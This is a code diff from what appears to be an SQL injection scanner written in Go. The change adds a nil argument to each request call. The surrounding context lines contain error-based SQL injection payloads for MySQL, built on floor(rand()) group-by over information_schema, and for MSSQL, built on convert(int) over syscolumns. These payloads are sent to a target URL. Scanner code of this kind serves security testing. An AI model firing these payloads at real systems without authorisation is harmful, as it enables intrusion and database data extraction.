@@ -179,7 +179,7 @@ func encodeStringAsChar(str string, separator string) string {
 }
 
 func (errsql *ClassSQLErrorMessages) TestInjection(index int, value string, confirmData []string) bool {
-	feature, err := errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, []byte(value))
+	feature, err := errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, []byte(value), nil)
 	errsql.trueFeatures = feature
 	if err != nil {
 		return false
@@ -196,7 +196,7 @@ func (errsql *ClassSQLErrorMessages) TestInjection(index int, value string, conf
 				markerEncodedMYSQL +
 				`) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)and` +
 				data
-			body_Feature, err := errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, []byte(confirmValue))
+			body_Feature, err := errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, []byte(confirmValue), nil)
 			if err != nil {
 				return false
 			}
@@ -210,7 +210,7 @@ func (errsql *ClassSQLErrorMessages) TestInjection(index int, value string, conf
 				markerEncodedMYSQL +
 				`),floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))` +
 				data
-			body_Feature, err = errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, []byte(confirmValue))
+			body_Feature, err = errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, []byte(confirmValue), nil)
 			if err != nil {
 				return false
 			}
@@ -223,7 +223,7 @@ func (errsql *ClassSQLErrorMessages) TestInjection(index int, value string, conf
 			} else {
 				confirmValue = data + `(select convert(int,` + markerEncodedMSSQL + `) FROM syscolumns)` + data
 			}
-			body_Feature, err = errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, []byte(confirmValue))
+			body_Feature, err = errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, []byte(confirmValue), nil)
 			if err != nil {
 				return false
 			}
@@ -236,7 +236,7 @@ func (errsql *ClassSQLErrorMessages) TestInjection(index int, value string, conf
 			} else {
 				confirmValue = data + `convert(int,` + markerEncodedMSSQL + `)` + data
 			}
-			body_Feature, err = errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, []byte(confirmValue))
+			body_Feature, err = errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, []byte(confirmValue), nil)
 			if err != nil {
 				return false
 			}
